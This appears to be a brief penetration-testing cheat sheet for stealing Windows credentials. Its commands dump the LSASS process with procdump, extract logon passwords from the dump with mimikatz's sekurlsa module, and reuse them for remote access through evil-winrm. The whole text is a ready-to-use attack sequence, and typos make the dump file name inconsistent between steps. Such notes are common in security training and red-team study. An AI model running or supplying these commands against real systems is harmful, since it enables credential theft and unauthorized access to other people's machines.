# Create a dump of lsass process:
`procdump.exe -ma lsass lass.dmp`

# Launch mimikatz:
# Use the minidump module in mimikaz
`sekurlsa::minidump lsass.dmp`
# Use the logonPasswords function
`sekurlsa::logonPasswords`

# After obtaining the password we can logon remotely
`evil-winrm -i <IP> -u <USER> -p <PASSWORD>`